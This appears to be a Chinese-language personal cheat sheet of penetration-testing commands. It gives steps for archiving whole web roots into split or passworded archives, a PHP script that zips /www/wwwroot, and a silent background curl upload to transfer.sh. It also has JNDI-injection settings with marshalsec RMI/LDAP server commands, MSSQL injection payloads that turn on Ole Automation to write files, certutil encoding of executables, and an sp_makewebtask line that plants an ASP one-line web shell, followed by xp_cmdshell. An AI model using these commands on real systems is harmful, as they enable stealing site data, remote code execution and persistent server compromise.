---
title: "笔记"
enableComment: false
hideToc : true
---


## 打包

```bash
"C:/Program Files/7-Zip/7z.exe" a D:\upload\2020\7\13\www.zip C:\inetpub\wwwroot\ -r -x!*.zip -x!*.7z -v200m

Rar.exe a -r -v500m -X*.rar -X*.zip sst.rar D:\wwwroot\sq\

tar -zcvf /tmp/www.tar.gz --exclude=upload --exclude *.png --exclude *.jpg --exclude *.gif --exclude *.mp* --exclude *.flv --exclude *.m4v --exclude *.pdf --exclude *.*tf --ignore-case /www/ | split -b 100M -d -a - www.tar.gz.

合并
copy /b www.tar.z01+www.tar.z02 backup.tar.gz

zip -s 100m -r -q -P password file.zip *.sql
```

```php
<?php
function addFileToZip($path,$zip){
    $handler=opendir($path); //打开当前文件夹由$path指定。
    while(($filename=readdir($handler))!==false){
        if($filename != "." && $filename != ".."){//文件夹文件名字为'.'和‘..’，不要对他们进行操作
            if(is_dir($path."/".$filename)){// 如果读取的某个对象是文件夹，则递归
                addFileToZip($path."/".$filename, $zip);
            }else{ //将文件加入zip对象
                $zip->addFile($path."/".$filename);
            }
        }
    }
    @closedir($path);
}
$zip=new ZipArchive();

if($zip->open('/tmp/backup.zip', ZipArchive::OVERWRITE)=== TRUE){
    addFileToZip('/www/wwwroot/', $zip); //调用方法，对要打包的根目录进行操作，并将ZipArchive的对象传递给方法
    $zip->close(); //关闭处理的zip文件
    echo 1;
}
```

## git
```
git submodule update --init --recursive
```

## java
```
-Djava.rmi.server.useCodebaseOnly=false -Dcom.sun.jndi.rmi.object.trustURLCodebase=true -Dcom.sun.jndi.ldap.object.trustURLCodebase=true -DsocksProxyHost=IP -DsocksProxyPort=8010
```

```
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://ip:80/#ExportObject 1099
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://ip:80/#ExportObject 1099
```
## 网盘
```
curl --silent --upload-file file.zip https://transfer.sh/file.zip >> upload.txt &
```

## 注入
MSSQL写入大文件
```sql
-- 开启权限（开启这2个权限后才能写文件）
-- 开启
exec sp_configure 'show advanced options', 1;RECONFIGURE;exec sp_configure 'Ole Automation Procedures',1;RECONFIGURE;
-- 关毕
exec sp_configure 'show advanced options', 1;RECONFIGURE;exec sp_configure 'Ole Automation Procedures',0;RECONFIGURE;
-- 写文件 这里@FilePath 是路径，@STR_CONTENT 是内容，整理流程是先创建在写入。t-sql读写文件
declare @FilePath nvarchar(400),@xmlstr varchar(8000);
Declare @INT_ERR int;
Declare @INT_FSO int;
Declare @INT_OPENFILE int;
Declare @STR_CONTENT as varchar(MAX);
DECLARE @output varchar(255);
DECLARE @hr int;
DECLARE @source varchar(255);
DECLARE @description varchar(255);
set @FilePath = 'c:/windows/tasks/111.txt';
set @STR_CONTENT = convert(varchar(MAX),0x313233);
EXEC @INT_ERR = sp_OACreate 'Scripting.FileSystemObject', @INT_FSO OUTPUT;
if(@INT_ERR <> 0) BEGIN EXEC sp_OAGetErrorInfo @INT_FSO RETURN END;
EXEC @INT_ERR=SP_OAMETHOD @INT_FSO,'CreateTextFile',@INT_OPENFILE OUTPUT,@FilePath;
EXEC @INT_ERR=SP_OAMETHOD @INT_OPENFILE,'Write',null,@STR_CONTENT;
EXEC @INT_ERR=SP_OADESTROY @INT_OPENFILE;
-- 配合certutil实现exe转base64
certutil -encode 1.exe 1.txt
-- base64解码
certutil -decode 1.txt 1.exe
```

MSSQL注入 把指定sql语句查询的东西写入文件
```sql
exec sp_configure 'Web Assistant Procedures', 1; RECONFIGURE;
exec sp_makewebtask 'c:\www\test.asp','select ''<%execute(request("SB"))%>'' '
exec master..xp_cmdshell 'type c:\www\test.asp'
```